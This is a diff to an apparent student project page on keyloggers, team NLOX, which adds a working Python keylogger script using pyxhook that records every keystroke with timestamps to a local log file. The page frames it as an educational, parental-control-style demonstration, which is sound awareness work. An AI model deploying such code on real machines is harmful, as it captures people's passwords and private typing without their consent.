@@ -34,10 +34,35 @@ BECAUSE 82% of breaches involve a human element, so even basic knowledge is cruc
 
 With access to your personal information, malicious users can cause a lot of damage. It’s therefore important to protect yourself from keyloggers so you don’t become a victim. You can reduce the likelihood of an attack by learning what behaviors can make you vulnerable to keylogger attacks and what precautions can be taken. According to Verizon’s 2022 Data Breach Investigations Report, 82% of breaches involve a human element. By being aware of the dangers, you can bolster your cybersecurity in order to better protect yourself / your organization against keylogger attacks. This is why our team at NLOX found it so vital to create our own keylogger as a way to better understand its uses and threat potential. 
 
-Q4: Supportive Data 📊
+Q4: Supportive Data/Source Code 📊
 
 Our presentation will not only go into detail on what a keylogger is but we will also demonstrate how to create one (image 2) and how it functions (image 1). Below you will find images of the script we created to make our own keylogger. This script is designed to only work and save a "log file" to the host machine and is intended to be used like a parental control for informative purposes only. *This process will be further elaborated on in our video presentation.
 We also intend to conduct extensive research on keyloggers usage in past known attacks such as "Darkhotel". a well-known keylogger malware attack that targeted unsecure Wi-Fi at hotels. While also making sure the presentation demonstrates the ethical uses of keyloggers.
+
+Source Code:
+#! /usr/bin/env python3
+import os
+import logging
+import pyxhook
+# Set the path to the log file, using the pylogger_file environment variable if available
+# Otherwise, use the default path ~/Desktop/file.log
+log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
+# Set the log format to include the timestamp, and specify the format of the timestamp
+log_format = '%(asctime)s - %(message)s'
+datefmt = '%Y:%m:%d %H:%M:%S'
+# Configure the logging module with the log file path, log level, and log format
+logging.basicConfig(filename=log_file, level=logging.INFO, format=log_format, datefmt=datefmt)
+# This function will be called every time a key is pressed, and will log the key that was pressed
+def OnKeyPress(event):
+    logging.info(event.Key)
+# Create an instance of the HookManager class from pyxhook
+new_hook = pyxhook.HookManager()
+# Set the KeyDown event to trigger the OnKeyPress function
+new_hook.KeyDown = OnKeyPress
+# Start the keylogger by calling HookKeyboard() on the HookManager instance
+new_hook.HookKeyboard()
+# Enter the event listener loop, which will keep the program running until it is stopped
+new_hook.start()
 
 
 Q5: The Result 🧩
